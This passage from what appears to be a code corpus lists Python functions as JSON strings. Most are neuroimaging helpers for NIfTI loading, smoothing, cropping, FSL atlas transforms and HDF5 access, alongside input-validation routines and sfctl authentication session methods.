            "def check_X_y(X, y, accept_sparse=None, dtype=None, order=None, copy=False,\n              force_all_finite=True, ensure_2d=True, allow_nd=False,\n              multi_output=False):\n    \"\"\"Input validation for standard estimators.\n\n    Checks X and y for consistent length, enforces X 2d and y 1d.\n    Standard input checks are only applied to y. For multi-label y,\n    set multi_ouput=True to allow 2d and sparse y.\n\n    Parameters\n    ----------\n    X : nd-array, list or sparse matrix\n        Input data.\n\n    y : nd-array, list or sparse matrix\n        Labels.\n\n    accept_sparse : string, list of string or None (default=None)\n        String[s] representing allowed sparse matrix formats, such as 'csc',\n        'csr', etc.  None means that sparse matrix input will raise an error.\n        If the input is sparse but not in the allowed format, it will be\n        converted to the first listed format.\n\n    order : 'F', 'C' or None (default=None)\n        Whether an array will be forced to be fortran or c-style.\n\n    copy : boolean (default=False)\n        Whether a forced copy will be triggered. If copy=False, a copy might\n        be triggered by a conversion.\n\n    force_all_finite : boolean (default=True)\n        Whether to raise an error on np.inf and np.nan in X.\n\n    ensure_2d : boolean (default=True)\n        Whether to make X at least 2d.\n\n    allow_nd : boolean (default=False)\n        Whether to allow X.ndim > 2.\n\n    Returns\n    -------\n    X_converted : object\n        The converted and validated X.\n    \"\"\"\n    X = check_array(X, accept_sparse, dtype, order, copy, force_all_finite,\n                    ensure_2d, allow_nd)\n    if multi_output:\n        y = check_array(y, 'csr', force_all_finite=True, ensure_2d=False)\n    else:\n        y = column_or_1d(y, warn=True)\n        _assert_all_finite(y)\n\n    check_consistent_length(X, y)\n\n    return X, y"
        ],
        [
            "def column_or_1d(y, warn=False):\n    \"\"\" Ravel column or 1d numpy array, else raises an error\n\n    Parameters\n    ----------\n    y : array-like\n\n    Returns\n    -------\n    y : array\n\n    \"\"\"\n    shape = np.shape(y)\n    if len(shape) == 1:\n        return np.ravel(y)\n    if len(shape) == 2 and shape[1] == 1:\n        if warn:\n            warnings.warn(\"A column-vector y was passed when a 1d array was\"\n                          \" expected. Please change the shape of y to \"\n                          \"(n_samples, ), for example using ravel().\",\n                          DataConversionWarning, stacklevel=2)\n        return np.ravel(y)\n\n    raise ValueError(\"bad input shape {0}\".format(shape))"
        ],
        [
            "def warn_if_not_float(X, estimator='This algorithm'):\n    \"\"\"Warning utility function to check that data type is floating point.\n\n    Returns True if a warning was raised (i.e. the input is not float) and\n    False otherwise, for easier input validation.\n    \"\"\"\n    if not isinstance(estimator, str):\n        estimator = estimator.__class__.__name__\n    if X.dtype.kind != 'f':\n        warnings.warn(\"%s assumes floating point values as input, \"\n                      \"got %s\" % (estimator, X.dtype))\n        return True\n    return False"
        ],
        [
            "def as_ndarray(arr, copy=False, dtype=None, order='K'):\n    \"\"\"Convert an arbitrary array to numpy.ndarray.\n\n    In the case of a memmap array, a copy is automatically made to break the\n    link with the underlying file (whatever the value of the \"copy\" keyword).\n\n    The purpose of this function is mainly to get rid of memmap objects, but\n    it can be used for other purposes. In particular, combining copying and\n    casting can lead to performance improvements in some cases, by avoiding\n    unnecessary copies.\n\n    If not specified, input array order is preserved, in all cases, even when\n    a copy is requested.\n\n    Caveat: this function does not copy during bool to/from 1-byte dtype\n    conversions. This can lead to some surprising results in some rare cases.\n    Example:\n\n        a = numpy.asarray([0, 1, 2], dtype=numpy.int8)\n        b = as_ndarray(a, dtype=bool)  # array([False, True, True], dtype=bool)\n        c = as_ndarray(b, dtype=numpy.int8)  # array([0, 1, 2], dtype=numpy.int8)\n\n    The usually expected result for the last line would be array([0, 1, 1])\n    because True evaluates to 1. Since there is no copy made here, the original\n    array is recovered.\n\n    Parameters\n    ----------\n    arr: array-like\n        input array. Any value accepted by numpy.asarray is valid.\n\n    copy: bool\n        if True, force a copy of the array. Always True when arr is a memmap.\n\n    dtype: any numpy dtype\n        dtype of the returned array. Performing copy and type conversion at the\n        same time can in some cases avoid an additional copy.\n\n    order: string\n        gives the order of the returned array.\n        Valid values are: \"C\", \"F\", \"A\", \"K\", None.\n        default is \"K\". See ndarray.copy() for more information.\n\n    Returns\n    -------\n    ret: np.ndarray\n        Numpy array containing the same data as arr, always of class\n        numpy.ndarray, and with no link to any underlying file.\n    \"\"\"\n    if order not in ('C', 'F', 'A', 'K', None):\n        raise ValueError(\"Invalid value for 'order': {}\".format(str(order)))\n\n    if isinstance(arr, np.memmap):\n        if dtype is None:\n            if order in ('K', 'A', None):\n                ret = np.array(np.asarray(arr), copy=True)\n            else:\n                ret = np.array(np.asarray(arr), copy=True, order=order)\n        else:\n            if order in ('K', 'A', None):\n                # always copy (even when dtype does not change)\n                ret = np.asarray(arr).astype(dtype)\n            else:\n                # load data from disk without changing order\n                # Changing order while reading through a memmap is incredibly\n                # inefficient.\n                ret = _asarray(np.array(arr, copy=True), dtype=dtype, order=order)\n\n    elif isinstance(arr, np.ndarray):\n        ret = _asarray(arr, dtype=dtype, order=order)\n        # In the present cas, np.may_share_memory result is always reliable.\n        if np.may_share_memory(ret, arr) and copy:\n            # order-preserving copy\n            ret = ret.T.copy().T if ret.flags['F_CONTIGUOUS'] else ret.copy()\n\n    elif isinstance(arr, (list, tuple)):\n        if order in (\"A\", \"K\"):\n            ret = np.asarray(arr, dtype=dtype)\n        else:\n            ret = np.asarray(arr, dtype=dtype, order=order)\n\n    else:\n        raise ValueError(\"Type not handled: {}\".format(arr.__class__))\n\n    return ret"
        ],
        [
            "def xfm_atlas_to_functional(atlas_filepath, anatbrain_filepath, meanfunc_filepath,\n                            atlas2anat_nonlin_xfm_filepath, is_atlas2anat_inverted,\n                            anat2func_lin_xfm_filepath,\n                            atlasinanat_out_filepath, atlasinfunc_out_filepath,\n                            interp='nn', rewrite=True, parallel=False):\n    \"\"\"Call FSL tools to apply transformations to a given atlas to a functional image.\n    Given the transformation matrices.\n\n    Parameters\n    ----------\n    atlas_filepath: str\n        Path to the 3D atlas volume file.\n\n    anatbrain_filepath: str\n        Path to the anatomical brain volume file (skull-stripped and registered to the same space as the atlas,\n        e.g., MNI).\n\n    meanfunc_filepath: str\n        Path to the average functional image to be used as reference in the last applywarp step.\n\n    atlas2anat_nonlin_xfm_filepath: str\n        Path to the atlas to anatomical brain linear transformation .mat file.\n        If you have the inverse transformation, i.e., anatomical brain to atlas, set is_atlas2anat_inverted to True.\n\n    is_atlas2anat_inverted: bool\n        If False will have to calculate the inverse atlas2anat transformation to apply the transformations.\n        This step will be performed with FSL invwarp.\n\n    anat2func_lin_xfm_filepath: str\n        Path to the anatomical to functional .mat linear transformation file.\n\n    atlasinanat_out_filepath: str\n        Path to output file which will contain the 3D atlas in the subject anatomical space.\n\n    atlasinfunc_out_filepath: str\n        Path to output file which will contain the 3D atlas in the subject functional space.\n\n    verbose: bool\n        If verbose will show DEBUG log info.\n\n    rewrite: bool\n        If True will re-run all the commands overwriting any existing file. Otherwise will check if\n        each file exists and if it does won't run the command.\n\n    parallel: bool\n        If True will launch the commands using ${FSLDIR}/fsl_sub to use the cluster infrastructure you have setup\n        with FSL (SGE or HTCondor).\n    \"\"\"\n    if is_atlas2anat_inverted:\n        # I already have the inverted fields I need\n        anat_to_mni_nl_inv = atlas2anat_nonlin_xfm_filepath\n    else:\n        # I am creating the inverted fields then...need output file path:\n        output_dir         = op.abspath   (op.dirname(atlasinanat_out_filepath))\n        ext                = get_extension(atlas2anat_nonlin_xfm_filepath)\n        anat_to_mni_nl_inv = op.join(output_dir, remove_ext(op.basename(atlas2anat_nonlin_xfm_filepath)) + '_inv' + ext)\n\n    # setup the commands to be called\n    invwarp_cmd   = op.join('${FSLDIR}', 'bin', 'invwarp')\n    applywarp_cmd = op.join('${FSLDIR}', 'bin', 'applywarp')\n    fslsub_cmd    = op.join('${FSLDIR}', 'bin', 'fsl_sub')\n\n    # add fsl_sub before the commands\n    if parallel:\n        invwarp_cmd   = fslsub_cmd + ' ' + invwarp_cmd\n        applywarp_cmd = fslsub_cmd + ' ' + applywarp_cmd\n\n    # create the inverse fields\n    if rewrite or (not is_atlas2anat_inverted and not op.exists(anat_to_mni_nl_inv)):\n        log.debug('Creating {}.\\n'.format(anat_to_mni_nl_inv))\n        cmd  = invwarp_cmd + ' '\n        cmd += '-w {} '.format(atlas2anat_nonlin_xfm_filepath)\n        cmd += '-o {} '.format(anat_to_mni_nl_inv)\n        cmd += '-r {} '.format(anatbrain_filepath)\n        log.debug('Running {}'.format(cmd))\n        check_call(cmd)\n\n    # transform the atlas to anatomical space\n    if rewrite or not op.exists(atlasinanat_out_filepath):\n        log.debug('Creating {}.\\n'.format(atlasinanat_out_filepath))\n        cmd  = applywarp_cmd + ' '\n        cmd += '--in={}     '.format(atlas_filepath)\n        cmd += '--ref={}    '.format(anatbrain_filepath)\n        cmd += '--warp={}   '.format(anat_to_mni_nl_inv)\n        cmd += '--interp={} '.format(interp)\n        cmd += '--out={}    '.format(atlasinanat_out_filepath)\n        log.debug('Running {}'.format(cmd))\n        check_call(cmd)\n\n    # transform the atlas to functional space\n    if rewrite or not op.exists(atlasinfunc_out_filepath):\n        log.debug('Creating {}.\\n'.format(atlasinfunc_out_filepath))\n        cmd  = applywarp_cmd + ' '\n        cmd += '--in={}     '.format(atlasinanat_out_filepath)\n        cmd += '--ref={}    '.format(meanfunc_filepath)\n        cmd += '--premat={} '.format(anat2func_lin_xfm_filepath)\n        cmd += '--interp={} '.format(interp)\n        cmd += '--out={}    '.format(atlasinfunc_out_filepath)\n        log.debug('Running {}'.format(cmd))\n        check_call(cmd)"
        ],
        [
            "def fwhm2sigma(fwhm):\n    \"\"\"Convert a FWHM value to sigma in a Gaussian kernel.\n\n    Parameters\n    ----------\n    fwhm: float or numpy.array\n       fwhm value or values\n\n    Returns\n    -------\n    fwhm: float or numpy.array\n       sigma values\n    \"\"\"\n    fwhm = np.asarray(fwhm)\n    return fwhm / np.sqrt(8 * np.log(2))"
        ],
        [
            "def sigma2fwhm(sigma):\n    \"\"\"Convert a sigma in a Gaussian kernel to a FWHM value.\n\n    Parameters\n    ----------\n    sigma: float or numpy.array\n       sigma value or values\n\n    Returns\n    -------\n    fwhm: float or numpy.array\n       fwhm values corresponding to `sigma` values\n    \"\"\"\n    sigma = np.asarray(sigma)\n    return np.sqrt(8 * np.log(2)) * sigma"
        ],
        [
            "def _smooth_data_array(arr, affine, fwhm, copy=True):\n    \"\"\"Smooth images with a a Gaussian filter.\n\n    Apply a Gaussian filter along the three first dimensions of arr.\n\n    Parameters\n    ----------\n    arr: numpy.ndarray\n        3D or 4D array, with image number as last dimension.\n\n    affine: numpy.ndarray\n        Image affine transformation matrix for image.\n\n    fwhm: scalar, numpy.ndarray\n        Smoothing kernel size, as Full-Width at Half Maximum (FWHM) in millimeters.\n        If a scalar is given, kernel width is identical on all three directions.\n        A numpy.ndarray must have 3 elements, giving the FWHM along each axis.\n\n    copy: bool\n        if True, will make a copy of the input array. Otherwise will directly smooth the input array.\n\n    Returns\n    -------\n    smooth_arr: numpy.ndarray\n    \"\"\"\n\n    if arr.dtype.kind == 'i':\n        if arr.dtype == np.int64:\n            arr = arr.astype(np.float64)\n        else:\n            arr = arr.astype(np.float32)\n    if copy:\n        arr = arr.copy()\n\n    # Zeroe possible NaNs and Inf in the image.\n    arr[np.logical_not(np.isfinite(arr))] = 0\n\n    try:\n        # Keep the 3D part of the affine.\n        affine = affine[:3, :3]\n\n        # Convert from FWHM in mm to a sigma.\n        fwhm_sigma_ratio = np.sqrt(8 * np.log(2))\n        vox_size         = np.sqrt(np.sum(affine ** 2, axis=0))\n        sigma            = fwhm / (fwhm_sigma_ratio * vox_size)\n        for n, s in enumerate(sigma):\n            ndimage.gaussian_filter1d(arr, s, output=arr, axis=n)\n    except:\n        raise ValueError('Error smoothing the array.')\n    else:\n        return arr"
        ],
        [
            "def smooth_imgs(images, fwhm):\n    \"\"\"Smooth images using a Gaussian filter.\n\n    Apply a Gaussian filter along the three first dimensions of each image in images.\n    In all cases, non-finite values in input are zeroed.\n\n    Parameters\n    ----------\n    imgs: str or img-like object or iterable of img-like objects\n        See boyle.nifti.read.read_img\n        Image(s) to smooth.\n\n    fwhm: scalar or numpy.ndarray\n        Smoothing kernel size, as Full-Width at Half Maximum (FWHM) in millimeters.\n        If a scalar is given, kernel width is identical on all three directions.\n        A numpy.ndarray must have 3 elements, giving the FWHM along each axis.\n\n    Returns\n    -------\n    smooth_imgs: nibabel.Nifti1Image or list of.\n        Smooth input image/s.\n    \"\"\"\n    if fwhm <= 0:\n        return images\n\n    if not isinstance(images, string_types) and hasattr(images, '__iter__'):\n        only_one = False\n    else:\n        only_one = True\n        images = [images]\n\n    result = []\n    for img in images:\n        img    = check_img(img)\n        affine = img.get_affine()\n        smooth = _smooth_data_array(img.get_data(), affine, fwhm=fwhm, copy=True)\n        result.append(nib.Nifti1Image(smooth, affine))\n\n    if only_one:\n        return result[0]\n    else:\n        return result"
        ],
        [
            "def _smooth_array(arr, affine, fwhm=None, ensure_finite=True, copy=True, **kwargs):\n    \"\"\"Smooth images by applying a Gaussian filter.\n    Apply a Gaussian filter along the three first dimensions of arr.\n\n    This is copied and slightly modified from nilearn:\n    https://github.com/nilearn/nilearn/blob/master/nilearn/image/image.py\n    Added the **kwargs argument.\n\n    Parameters\n    ==========\n    arr: numpy.ndarray\n        4D array, with image number as last dimension. 3D arrays are also\n        accepted.\n    affine: numpy.ndarray\n        (4, 4) matrix, giving affine transformation for image. (3, 3) matrices\n        are also accepted (only these coefficients are used).\n        If fwhm='fast', the affine is not used and can be None\n    fwhm: scalar, numpy.ndarray, 'fast' or None\n        Smoothing strength, as a full-width at half maximum, in millimeters.\n        If a scalar is given, width is identical on all three directions.\n        A numpy.ndarray must have 3 elements, giving the FWHM along each axis.\n        If fwhm == 'fast', a fast smoothing will be performed with\n        a filter [0.2, 1, 0.2] in each direction and a normalisation\n        to preserve the local average value.\n        If fwhm is None, no filtering is performed (useful when just removal\n        of non-finite values is needed).\n    ensure_finite: bool\n        if True, replace every non-finite values (like NaNs) by zero before\n        filtering.\n    copy: bool\n        if True, input array is not modified. False by default: the filtering\n        is performed in-place.\n    kwargs: keyword-arguments\n        Arguments for the ndimage.gaussian_filter1d function.\n\n    Returns\n    =======\n    filtered_arr: numpy.ndarray\n        arr, filtered.\n    Notes\n    =====\n    This function is most efficient with arr in C order.\n    \"\"\"\n\n    if arr.dtype.kind == 'i':\n        if arr.dtype == np.int64:\n            arr = arr.astype(np.float64)\n        else:\n            # We don't need crazy precision\n            arr = arr.astype(np.float32)\n    if copy:\n        arr = arr.copy()\n\n    if ensure_finite:\n        # SPM tends to put NaNs in the data outside the brain\n        arr[np.logical_not(np.isfinite(arr))] = 0\n\n    if fwhm == 'fast':\n        arr = _fast_smooth_array(arr)\n    elif fwhm is not None:\n        # Keep only the scale part.\n        affine = affine[:3, :3]\n\n        # Convert from a FWHM to a sigma:\n        fwhm_over_sigma_ratio = np.sqrt(8 * np.log(2))\n        vox_size = np.sqrt(np.sum(affine ** 2, axis=0))\n        sigma = fwhm / (fwhm_over_sigma_ratio * vox_size)\n        for n, s in enumerate(sigma):\n            ndimage.gaussian_filter1d(arr, s, output=arr, axis=n, **kwargs)\n\n    return arr"
        ],
        [
            "def smooth_img(imgs, fwhm, **kwargs):\n    \"\"\"Smooth images by applying a Gaussian filter.\n    Apply a Gaussian filter along the three first dimensions of arr.\n    In all cases, non-finite values in input image are replaced by zeros.\n\n    This is copied and slightly modified from nilearn:\n    https://github.com/nilearn/nilearn/blob/master/nilearn/image/image.py\n    Added the **kwargs argument.\n\n    Parameters\n    ==========\n    imgs: Niimg-like object or iterable of Niimg-like objects\n        See http://nilearn.github.io/manipulating_images/manipulating_images.html#niimg.\n        Image(s) to smooth.\n    fwhm: scalar, numpy.ndarray, 'fast' or None\n        Smoothing strength, as a Full-Width at Half Maximum, in millimeters.\n        If a scalar is given, width is identical on all three directions.\n        A numpy.ndarray must have 3 elements, giving the FWHM along each axis.\n        If fwhm == 'fast', a fast smoothing will be performed with\n        a filter [0.2, 1, 0.2] in each direction and a normalisation\n        to preserve the scale.\n        If fwhm is None, no filtering is performed (useful when just removal\n        of non-finite values is needed)\n    Returns\n    =======\n    filtered_img: nibabel.Nifti1Image or list of.\n        Input image, filtered. If imgs is an iterable, then filtered_img is a\n        list.\n    \"\"\"\n\n    # Use hasattr() instead of isinstance to workaround a Python 2.6/2.7 bug\n    # See http://bugs.python.org/issue7624\n    if hasattr(imgs, \"__iter__\") \\\n       and not isinstance(imgs, string_types):\n        single_img = False\n    else:\n        single_img = True\n        imgs = [imgs]\n\n    ret = []\n    for img in imgs:\n        img = check_niimg(img)\n        affine = img.get_affine()\n        filtered = _smooth_array(img.get_data(), affine, fwhm=fwhm,\n                                 ensure_finite=True, copy=True, **kwargs)\n        ret.append(new_img_like(img, filtered, affine, copy_header=True))\n\n    if single_img:\n        return ret[0]\n    else:\n        return ret"
        ],
        [
            "def signed_session(self, session=None):\n        \"\"\"Create requests session with any required auth headers\n        applied.\n\n        :rtype: requests.Session.\n        \"\"\"\n\n        if session:\n            session = super(ClientCertAuthentication, self).signed_session(session)\n        else:\n            session = super(ClientCertAuthentication, self).signed_session()\n\n        if self.cert is not None:\n            session.cert = self.cert\n        if self.ca_cert is not None:\n            session.verify = self.ca_cert\n        if self.no_verify:\n            session.verify = False\n\n        return session"
        ],
        [
            "def signed_session(self, session=None):\n        \"\"\"Create requests session with AAD auth headers\n\n        :rtype: requests.Session.\n        \"\"\"\n\n        from sfctl.config import (aad_metadata, aad_cache)\n\n        if session:\n            session = super(AdalAuthentication, self).signed_session(session)\n        else:\n            session = super(AdalAuthentication, self).signed_session()\n\n        if self.no_verify:\n            session.verify = False\n\n        authority_uri, cluster_id, client_id = aad_metadata()\n        existing_token, existing_cache = aad_cache()\n        context = adal.AuthenticationContext(authority_uri,\n                                             cache=existing_cache)\n        new_token = context.acquire_token(cluster_id,\n                                          existing_token['userId'], client_id)\n        header = \"{} {}\".format(\"Bearer\", new_token['accessToken'])\n        session.headers['Authorization'] = header\n        return session"
        ],
        [
            "def voxspace_to_mmspace(img):\n    \"\"\" Return a grid with coordinates in 3D physical space for `img`.\"\"\"\n    shape, affine = img.shape[:3], img.affine\n    coords = np.array(np.meshgrid(*(range(i) for i in shape), indexing='ij'))\n    coords = np.rollaxis(coords, 0, len(shape) + 1)\n    mm_coords = nib.affines.apply_affine(affine, coords)\n\n    return mm_coords"
        ],
        [
            "def get_3D_coordmap(img):\n    '''\n    Gets a 3D CoordinateMap from img.\n\n    Parameters\n    ----------\n    img: nib.Nifti1Image or nipy Image\n\n    Returns\n    -------\n    nipy.core.reference.coordinate_map.CoordinateMap\n    '''\n    if isinstance(img, nib.Nifti1Image):\n        img = nifti2nipy(img)\n\n    if img.ndim == 4:\n        from nipy.core.reference.coordinate_map import drop_io_dim\n        cm = drop_io_dim(img.coordmap, 3)\n    else:\n        cm = img.coordmap\n\n    return cm"
        ],
        [
            "def get_img_info(image):\n    \"\"\"Return the header and affine matrix from a Nifti file.\n\n    Parameters\n    ----------\n    image: img-like object or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    Returns\n    -------\n    hdr, aff\n    \"\"\"\n    try:\n        img = check_img(image)\n    except Exception as exc:\n        raise Exception('Error reading file {0}.'.format(repr_imgs(image))) from exc\n    else:\n        return img.get_header(), img.get_affine()"
        ],
        [
            "def get_img_data(image, copy=True):\n    \"\"\"Return the voxel matrix of the Nifti file.\n    If safe_mode will make a copy of the img before returning the data, so the input image is not modified.\n\n    Parameters\n    ----------\n    image: img-like object or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    copy: bool\n    If safe_mode will make a copy of the img before returning the data, so the input image is not modified.\n\n    Returns\n    -------\n    array_like\n    \"\"\"\n    try:\n        img = check_img(image)\n        if copy:\n            return get_data(img)\n        else:\n            return img.get_data()\n    except Exception as exc:\n        raise Exception('Error when reading file {0}.'.format(repr_imgs(image))) from exc"
        ],
        [
            "def load_nipy_img(nii_file):\n    \"\"\"Read a Nifti file and return as nipy.Image\n\n    Parameters\n    ----------\n    param nii_file: str\n        Nifti file path\n\n    Returns\n    -------\n    nipy.Image\n    \"\"\"\n    # delayed import because could not install nipy on Python 3 on OSX\n    import nipy\n\n    if not os.path.exists(nii_file):\n        raise FileNotFound(nii_file)\n\n    try:\n        return nipy.load_image(nii_file)\n    except Exception as exc:\n        raise Exception('Reading file {0}.'.format(repr_imgs(nii_file))) from exc"
        ],
        [
            "def niftilist_to_array(img_filelist, outdtype=None):\n    \"\"\"\n    From the list of absolute paths to nifti files, creates a Numpy array\n    with the data.\n\n    Parameters\n    ----------\n    img_filelist:  list of str\n        List of absolute file paths to nifti files. All nifti files must have\n        the same shape.\n\n    outdtype: dtype\n        Type of the elements of the array, if not set will obtain the dtype from\n        the first nifti file.\n\n    Returns\n    -------\n    outmat: Numpy array with shape N x prod(vol.shape)\n            containing the N files as flat vectors.\n\n    vol_shape: Tuple with shape of the volumes, for reshaping.\n\n    \"\"\"\n    try:\n        first_img = img_filelist[0]\n        vol       = get_img_data(first_img)\n    except IndexError as ie:\n        raise Exception('Error getting the first item of img_filelis: {}'.format(repr_imgs(img_filelist[0]))) from ie\n\n    if not outdtype:\n        outdtype = vol.dtype\n\n    outmat = np.zeros((len(img_filelist), np.prod(vol.shape)), dtype=outdtype)\n\n    try:\n        for i, img_file in enumerate(img_filelist):\n            vol = get_img_data(img_file)\n            outmat[i, :] = vol.flatten()\n    except Exception as exc:\n        raise Exception('Error on reading file {0}.'.format(img_file)) from exc\n\n    return outmat, vol.shape"
        ],
        [
            "def _crop_img_to(image, slices, copy=True):\n    \"\"\"Crops image to a smaller size\n\n    Crop img to size indicated by slices and modify the affine accordingly.\n\n    Parameters\n    ----------\n    image: img-like object or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n        Image to be cropped.\n\n    slices: list of slices\n        Defines the range of the crop.\n        E.g. [slice(20, 200), slice(40, 150), slice(0, 100)]\n        defines a 3D cube\n\n        If slices has less entries than image has dimensions,\n        the slices will be applied to the first len(slices) dimensions.\n\n    copy: boolean\n        Specifies whether cropped data is to be copied or not.\n        Default: True\n\n    Returns\n    -------\n    cropped_img: img-like object\n        Cropped version of the input image\n    \"\"\"\n\n    img    = check_img(image)\n    data   = img.get_data()\n    affine = img.get_affine()\n\n    cropped_data = data[slices]\n    if copy:\n        cropped_data   = cropped_data.copy()\n\n    linear_part        = affine[:3, :3]\n    old_origin         = affine[:3,  3]\n    new_origin_voxel   = np.array([s.start for s in slices])\n    new_origin         = old_origin + linear_part.dot(new_origin_voxel)\n\n    new_affine         = np.eye(4)\n    new_affine[:3, :3] = linear_part\n    new_affine[:3,  3] = new_origin\n\n    new_img = nib.Nifti1Image(cropped_data, new_affine)\n\n    return new_img"
        ],
        [
            "def crop_img(image, rtol=1e-8, copy=True):\n    \"\"\"Crops img as much as possible\n\n    Will crop img, removing as many zero entries as possible\n    without touching non-zero entries. Will leave one voxel of\n    zero padding around the obtained non-zero area in order to\n    avoid sampling issues later on.\n\n    Parameters\n    ----------\n    image: img-like object or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n        Image to be cropped.\n\n    rtol: float\n        relative tolerance (with respect to maximal absolute\n        value of the image), under which values are considered\n        negligeable and thus croppable.\n\n    copy: boolean\n        Specifies whether cropped data is copied or not.\n\n    Returns\n    -------\n    cropped_img: image\n        Cropped version of the input image\n    \"\"\"\n\n    img              = check_img(image)\n    data             = img.get_data()\n    infinity_norm    = max(-data.min(), data.max())\n    passes_threshold = np.logical_or(data < -rtol * infinity_norm,\n                                     data >  rtol * infinity_norm)\n\n    if data.ndim == 4:\n        passes_threshold = np.any(passes_threshold, axis=-1)\n\n    coords = np.array(np.where(passes_threshold))\n    start  = coords.min(axis=1)\n    end    = coords.max(axis=1) + 1\n\n    # pad with one voxel to avoid resampling problems\n    start = np.maximum(start - 1, 0)\n    end   = np.minimum(end   + 1, data.shape[:3])\n\n    slices = [slice(s, e) for s, e in zip(start, end)]\n\n    return _crop_img_to(img, slices, copy=copy)"
        ],
        [
            "def new_img_like(ref_niimg, data, affine=None, copy_header=False):\n    \"\"\"Create a new image of the same class as the reference image\n\n    Parameters\n    ----------\n    ref_niimg: image\n        Reference image. The new image will be of the same type.\n\n    data: numpy array\n        Data to be stored in the image\n\n    affine: 4x4 numpy array, optional\n        Transformation matrix\n\n    copy_header: boolean, optional\n        Indicated if the header of the reference image should be used to\n        create the new image\n\n    Returns\n    -------\n    new_img: image\n        A loaded image with the same type (and header) as the reference image.\n    \"\"\"\n    # Hand-written loading code to avoid too much memory consumption\n    if not (hasattr(ref_niimg, 'get_data')\n              and hasattr(ref_niimg,'get_affine')):\n        if isinstance(ref_niimg, _basestring):\n            ref_niimg = nib.load(ref_niimg)\n        elif operator.isSequenceType(ref_niimg):\n            ref_niimg = nib.load(ref_niimg[0])\n        else:\n            raise TypeError(('The reference image should be a niimg, %r '\n                            'was passed') % ref_niimg )\n\n    if affine is None:\n        affine = ref_niimg.get_affine()\n    if data.dtype == bool:\n        default_dtype = np.int8\n        if (LooseVersion(nib.__version__) >= LooseVersion('1.2.0') and\n                isinstance(ref_niimg, nib.freesurfer.mghformat.MGHImage)):\n            default_dtype = np.uint8\n        data = as_ndarray(data, dtype=default_dtype)\n    header = None\n    if copy_header:\n        header = copy.copy(ref_niimg.get_header())\n        header['scl_slope'] = 0.\n        header['scl_inter'] = 0.\n        header['glmax'] = 0.\n        header['cal_max'] = np.max(data) if data.size > 0 else 0.\n        header['cal_max'] = np.min(data) if data.size > 0 else 0.\n    return ref_niimg.__class__(data, affine, header=header)"
        ],
        [
            "def get_h5file(file_path, mode='r'):\n    \"\"\" Return the h5py.File given its file path.\n\n    Parameters\n    ----------\n    file_path: string\n        HDF5 file path\n\n    mode: string\n        r   Readonly, file must exist\n        r+  Read/write, file must exist\n        w   Create file, truncate if exists\n        w-  Create file, fail if exists\n        a   Read/write if exists, create otherwise (default)\n\n    Returns\n    -------\n    h5file: h5py.File\n    \"\"\"\n    if not op.exists(file_path):\n        raise IOError('Could not find file {}.'.format(file_path))\n\n    try:\n        h5file = h5py.File(file_path, mode=mode)\n    except:\n        raise\n    else:\n        return h5file"
        ],
        [
            "def extract_datasets(h5file, h5path='/'):\n    \"\"\" Return all dataset contents from h5path group in h5file in an OrderedDict.\n\n    Parameters\n    ----------\n    h5file: h5py.File\n        HDF5 file object\n\n    h5path: str\n        HDF5 group path to read datasets from\n\n    Returns\n    -------\n    datasets: OrderedDict\n        Dict with variables contained in file_path/h5path\n    \"\"\"\n    if isinstance(h5file, str):\n        _h5file = h5py.File(h5file, mode='r')\n    else:\n        _h5file = h5file\n\n    _datasets = get_datasets(_h5file, h5path)\n    datasets  = OrderedDict()\n    try:\n        for ds in _datasets:\n            datasets[ds.name.split('/')[-1]] = ds[:]\n    except:\n        raise RuntimeError('Error reading datasets in {}/{}.'.format(_h5file.filename, h5path))\n    finally:\n        if isinstance(h5file, str):\n            _h5file.close()\n\n    return datasets"
        ],
        [
            "def _get_node_names(h5file, h5path='/', node_type=h5py.Dataset):\n    \"\"\"Return the node of type node_type names within h5path of h5file.\n\n    Parameters\n    ----------\n    h5file: h5py.File\n        HDF5 file object\n\n    h5path: str\n        HDF5 group path to get the group names from\n\n    node_type: h5py object type\n        HDF5 object type\n\n    Returns\n    -------\n    names: list of str\n        List of names\n    \"\"\"\n    if isinstance(h5file, str):\n        _h5file = get_h5file(h5file, mode='r')\n    else:\n        _h5file = h5file\n\n    if not h5path.startswith('/'):\n        h5path = '/' + h5path\n\n    names = []\n    try:\n        h5group = _h5file.require_group(h5path)\n\n        for node in _hdf5_walk(h5group, node_type=node_type):\n            names.append(node.name)\n    except:\n        raise RuntimeError('Error getting node names from {}/{}.'.format(_h5file.filename, h5path))\n    finally:\n        if isinstance(h5file, str):\n            _h5file.close()\n\n    return names"
        ],
        [
            "def mask(self, image):\n        \"\"\" self.mask setter\n\n        Parameters\n        ----------\n        image: str or img-like object.\n            See NeuroImage constructor docstring.\n        \"\"\"\n        if image is None:\n            self._mask = None\n\n        try:\n            mask = load_mask(image)\n        except Exception as exc:\n            raise Exception('Could not load mask image {}.'.format(image)) from exc\n        else:\n            self._mask = mask"
        ],
        [
